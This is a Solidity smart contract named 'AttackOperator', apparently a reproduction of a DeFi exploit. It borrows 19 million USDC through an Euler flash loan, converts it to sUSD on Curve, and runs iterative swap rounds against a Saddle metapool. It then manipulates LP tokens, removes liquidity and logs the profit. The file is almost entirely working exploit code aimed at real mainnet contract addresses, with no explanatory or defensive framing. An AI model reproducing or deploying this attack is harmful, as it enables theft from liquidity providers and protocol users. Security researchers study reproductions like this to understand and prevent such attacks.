//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface IEulerFlashLoan {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);

    function maxFlashLoan(address token) external view returns (uint);
}

interface ICurve {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface ISaddle {
    function swap(
        uint8 i,
        uint8 j,
        uint256 dx,
        uint256 min_dy,
        uint deadline
    ) external returns (uint);

    function getTokenBalance(uint8 index) external view returns (uint256);

    function calculateSwap(
        uint8 tokenIndexFrom,
        uint8 tokenIndexTo,
        uint256 dx
    ) external view returns (uint256);

    function removeLiquidity(
        uint256 amount,
        uint256[] calldata minAmounts,
        uint256 deadline
    ) external returns (uint256[] memory);

    function getTokenIndex(address tokenAddress) external view returns (uint8);
}

contract AttackOperator is Ownable {
    constructor() public {}

    receive() external payable {}

    fallback() external payable {}

    address private constant euler_flash_loan_ca =
        0x07df2ad9878F8797B4055230bbAE5C808b8259b3; // 0xCD04c09a16fC4E8DB47C930AC90C89f79F20aEB4
    address private constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant susd = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
    address private constant dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant saddleUsdV2 =
        0x5f86558387293b6009d7896A61fcc86C17808D62;
    address private constant curvepool =
        0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;
    address private constant curve3Pool =
        0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address private constant saddlepool =
        0x824dcD7b044D60df2e89B1bB888e66D8BCf41491;
    address private constant saddleUSDpool =
        0xaCb83E0633d6605c5001e2Ab59EF3C745547C8C7;
    // address private constant curveUSDTpool =
    //     0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;

    uint256 ONE_USDT = 10 ** 6;
    uint256 ONE_USDC = 10 ** 6;
    uint256 ONE_DAI = 10 ** 18;
    uint256 ONE_SUSD = 10 ** 18;

    function operate() public {
        IEulerFlashLoan(euler_flash_loan_ca).flashLoan(
            address(this),
            usdc,
            // 15000000e6,
            19000000e6,
            // usdc_max_loan,
            new bytes(0)
        );

        console.log(
            "Attack Profit: %s USDC, with an additional profit of %s USDT and %s DAI",
            IERC20(usdc).balanceOf(address(this)) / ONE_USDC,
            IERC20(usdt).balanceOf(address(this)) / ONE_USDT,
            IERC20(dai).balanceOf(address(this)) / ONE_DAI
        );
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        // optimizer paras
        uint threshold = 10000e18;
        uint8 k = 1;
        uint8 iterations = 12;

        console.log(
            "flash Loan %s usdc",
            IERC20(usdc).balanceOf(address(this))
        );

        exchangeForSUSD();

        console.log(
            "exchange for %s sUSD",
            IERC20(susd).balanceOf(address(this))
        );

        attackSusd(threshold, k, iterations);

        attackLp();

        removeLiquidity();

        exchangeForUSDC();

        //Repay Loan
        IERC20(usdc).approve(msg.sender, amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function exchangeDaiForUsdc() internal {}

    function removeLiquidity() internal {
        uint256[] memory minAmounts = new uint256[](3);
        minAmounts[0] = 0;
        minAmounts[1] = 0;
        minAmounts[2] = 0;
        IERC20(saddleUsdV2).approve(
            saddleUSDpool,
            IERC20(saddleUsdV2).balanceOf(address(this))
        );
        ISaddle(saddleUSDpool).removeLiquidity(
            IERC20(saddleUsdV2).balanceOf(address(this)),
            minAmounts,
            block.timestamp
        );
    }

    function exchangeForUSDC() internal {
        IERC20(susd).approve(curvepool, IERC20(susd).balanceOf(address(this)));
        ICurve(curvepool).exchange(
            3,
            1,
            IERC20(susd).balanceOf(address(this)),
            1
        );
    }

    function exchangeForSUSD() internal {
        //Swap USDC to SUSD Via Curve
        uint amount = IERC20(usdc).balanceOf(address(this));
        IERC20(usdc).approve(curvepool, amount);
        ICurve(curvepool).exchange(1, 3, amount, 1);
    }

    function attackSusd(uint threshold, uint8 k, uint256 iterations) internal {
        uint8 i = 1;
        uint8 j = 100;

        // Round 1
        uint256 beforeSusd = IERC20(susd).balanceOf(address(this));

        swapToSaddle(j);
        swapFromSaddle(IERC20(saddleUsdV2).balanceOf(address(this)));
        uint256 afterSusd = IERC20(susd).balanceOf(address(this));
        require(afterSusd > beforeSusd, "profit loss at first!");
        console.log("profit %s sUSD in round %s", afterSusd - beforeSusd, i);

        // update
        i++;

        while (
            ISaddle(saddlepool).calculateSwap(
                0,
                1,
                ((ISaddle(saddlepool).getTokenBalance(0) +
                    ISaddle(saddlepool).getTokenBalance(1)) * j) / 100
            ) <
            ISaddle(saddlepool).getTokenBalance(1) &&
            afterSusd > beforeSusd &&
            i < iterations
        ) {
            beforeSusd = afterSusd;
            swapToSaddle(j);
            swapFromSaddle(IERC20(saddleUsdV2).balanceOf(address(this)));
            afterSusd = IERC20(susd).balanceOf(address(this));

            if (afterSusd - beforeSusd < threshold) {
                console.log("attack stop by threshold");
                break;
            }

            console.log(
                "profit %s sUSD in round %s",
                afterSusd - beforeSusd,
                i
            );

            i++;

            while (
                ISaddle(saddlepool).calculateSwap(
                    0,
                    1,
                    ((ISaddle(saddlepool).getTokenBalance(0) +
                        ISaddle(saddlepool).getTokenBalance(1)) * j) / 100
                ) > ISaddle(saddlepool).getTokenBalance(1)
            ) {
                j = j - 5 * k;
                k = k * 2;
            }
        }
    }

    function attackLp() internal {
        uint256 amount = 1900000e18;
        swapSaddle(amount);
    }

    function swapToSaddle(uint8 j) internal {
        //Swap SUSD for SaddleUSDV2
        uint8 r = j;
        uint sUSDAmount = ((ISaddle(saddlepool).getTokenBalance(0) +
            ISaddle(saddlepool).getTokenBalance(1)) * r) / 100;
        IERC20(susd).approve(saddlepool, sUSDAmount);
        ISaddle(saddlepool).swap(0, 1, sUSDAmount, 1, block.timestamp);
    }

    function swapFromSaddle(uint amount) internal {
        //Swap SaddleUSDV2 for SUSD
        uint saddleUSDV2Amount = amount;
        IERC20(saddleUsdV2).approve(saddlepool, saddleUSDV2Amount);
        ISaddle(saddlepool).swap(1, 0, saddleUSDV2Amount, 1, block.timestamp);
    }

    function swapSaddle(uint256 amount) internal {
        //Swap SUSD for SaddleUSDV2
        uint sUSDAmount = amount;
        IERC20(susd).approve(saddlepool, sUSDAmount);
        ISaddle(saddlepool).swap(0, 1, sUSDAmount, 1, block.timestamp);
    }

    function checkpoint() internal pure {
        require(false, "checkpoint");
    }
}
